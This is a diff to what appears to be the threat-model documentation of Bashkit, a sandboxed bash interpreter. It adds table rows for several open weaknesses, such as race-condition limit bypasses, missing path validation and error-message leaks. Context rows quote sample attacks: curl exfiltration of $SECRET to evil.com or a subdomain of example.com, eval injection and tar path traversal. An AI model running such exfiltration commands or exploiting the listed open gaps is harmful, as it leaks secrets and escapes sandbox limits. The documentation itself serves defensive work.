@@ -36,6 +36,9 @@ through configurable limits.
 | Parser attack (TM-DOS-024) | Malformed input | `parser_timeout` | [`limits.rs`][limits] |
 | Filesystem bomb (TM-DOS-007) | Zip bomb extraction | `FsLimits` | [`fs/limits.rs`][fslimits] |
 | Many files (TM-DOS-006) | Create 1M files | `max_file_count` | [`fs/limits.rs`][fslimits] |
+| TOCTOU append (TM-DOS-034) | Concurrent appends bypass limits | Single write lock | **OPEN** |
+| OverlayFs limit gaps (TM-DOS-035-038) | CoW/whiteout/accounting bugs | Combined limit accounting | **OPEN** |
+| Missing validate_path (TM-DOS-039) | VFS methods skip path checks | Add to all methods | **OPEN** |
 | Diff algorithm DoS (TM-DOS-028) | `diff` on large unrelated files | LCS matrix cap (10M cells) | [`builtins/diff.rs`][diff] |
 | Arithmetic overflow (TM-DOS-029) | `$(( 2 ** -1 ))` | Use wrapping arithmetic | **OPEN** |
 | Parser limit bypass (TM-DOS-030) | eval/source ignore limits | Use `Parser::with_limits()` | **OPEN** |
@@ -78,6 +81,7 @@ Scripts may attempt to break out of the sandbox to access the host system.
 | External commands (TM-ESC-006) | `./malicious` | No external exec | Returns exit 127 |
 | eval injection (TM-ESC-008) | `eval "$input"` | Sandboxed eval | Only runs builtins |
 | VFS limit bypass (TM-ESC-012) | `add_file()` skips limits | Restrict API visibility | **OPEN** |
+| Custom builtins lost (TM-ESC-014) | `std::mem::take` empties builtins | Clone/Arc builtins | **OPEN** |
 
 **Virtual Filesystem:**
 
@@ -108,6 +112,7 @@ Scripts may attempt to leak sensitive information.
 | Network exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | [`network/allowlist.rs`][allowlist] |
 | Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env impl | **OPEN** |
 | Real PID leak (TM-INF-014) | `$$` returns real PID | Return virtual value | **OPEN** |
+| Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **OPEN** |
 
 **Caller Responsibility (TM-INF-001):**
 
@@ -204,6 +209,7 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | Terminal escapes (TM-INJ-008) | ANSI sequences in output | Caller should sanitize |
 | Internal var injection (TM-INJ-009) | Set `_READONLY_X=""` | Isolate internal namespace | **OPEN** |
 | Tar path traversal (TM-INJ-010) | `tar -xf` with `../` entries | Validate extract paths | **OPEN** |
+| Cyclic nameref (TM-INJ-011) | Cyclic refs resolve silently | Detect cycle, error | **OPEN** |
 
 **Variable Expansion:**
 
@@ -342,6 +348,8 @@ Python `pathlib.Path` operations are bridged to Bashkit's virtual filesystem.
 | Shell injection (TM-PY-023) | deepagents.py f-strings | Use shlex.quote() | **OPEN** |
 | Heredoc escape (TM-PY-024) | Content contains delimiter | Random delimiter | **OPEN** |
 | GIL deadlock (TM-PY-025) | execute_sync holds GIL | py.allow_threads() | **OPEN** |
+| Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **OPEN** |
+| JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **OPEN** |
 
 **Architecture:**
 
